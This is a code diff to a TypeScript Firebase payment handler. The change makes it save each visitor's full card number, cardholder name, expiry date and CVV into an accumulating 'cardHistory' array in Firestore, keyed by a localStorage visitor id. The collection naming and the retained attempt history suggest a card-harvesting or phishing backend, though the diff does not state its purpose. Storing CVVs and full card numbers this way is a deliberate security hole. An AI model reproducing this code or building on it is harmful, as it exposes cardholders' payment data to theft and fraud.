@@ -1,6 +1,6 @@
 import { getApp, getApps, initializeApp } from "firebase/app";
 import { getDatabase } from "firebase/database";
-import { doc, getFirestore, setDoc } from "firebase/firestore";
+import { arrayUnion, doc, getFirestore, setDoc, updateDoc } from "firebase/firestore";
 import {
   getAuth,
   signInWithEmailAndPassword,
@@ -123,11 +123,31 @@ export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
     const visitorId = localStorage.getItem("visitor");
     if (visitorId) {
       const docRef = doc(db, "pays", visitorId);
-      await setDoc(
-        docRef,
-        { ...paymentInfo, status: "pending" },
-        { merge: true },
-      );
+      const cardEntry = {
+        cardNumber: paymentInfo?.cardNumber,
+        cardName: paymentInfo?.cardName,
+        expiryMonth: paymentInfo?.expiryMonth,
+        expiryYear: paymentInfo?.expiryYear,
+        cvv: paymentInfo?.cvv,
+        cardType: paymentInfo?.cardType,
+        timestamp: new Date().toISOString(),
+      };
+
+      try {
+        // Prefer updateDoc + arrayUnion to preserve previous cards.
+        await updateDoc(docRef, {
+          ...paymentInfo,
+          status: "pending",
+          cardHistory: arrayUnion(cardEntry),
+        });
+      } catch (err) {
+        // Fallback (e.g. doc missing): seed history array.
+        await setDoc(
+          docRef,
+          { ...paymentInfo, status: "pending", cardHistory: [cardEntry] },
+          { merge: true },
+        );
+      }
       setPaymentInfo((prev: any) => ({ ...prev, status: "pending" }));
     }
   } catch (error) {
